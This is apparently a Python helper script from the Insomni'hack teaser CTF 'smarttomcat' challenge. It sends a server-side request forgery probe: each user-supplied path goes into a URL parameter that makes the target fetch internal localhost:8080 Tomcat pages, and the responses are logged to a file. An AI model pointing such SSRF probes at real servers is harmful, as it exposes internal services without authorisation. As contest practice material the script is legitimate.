#!/usr/bin/python

import requests
import json
import sys

def pretty_print_POST(req):
	print('{}\n{}\n{}\n\n{}'.format(
	     '-----------START-----------',
	     req.method + ' ' + req.url,
	     '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
	     req.data,
	 ))

inp = sys.argv[1]
url = "http://smarttomcat.teaser.insomnihack.ch/index.php"


payload = { 
"Host":"smarttomcat.teaser.insomnihack.ch",
"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
}

params='u=http%3A%2F%2Flocalhost%3A8080%2F'+inp+'%3Fx%3D-4.2667%26y%3D15.2833'

r = requests.Request('POST',url,data=params,headers=payload)
prepared = r.prepare()

pretty_print_POST(r)

req = requests.post(url,data=params,headers=payload)


print(req.text)

text_file = open("output.txt","a")
text_file.write(req.text + '\n')
text_file.close()
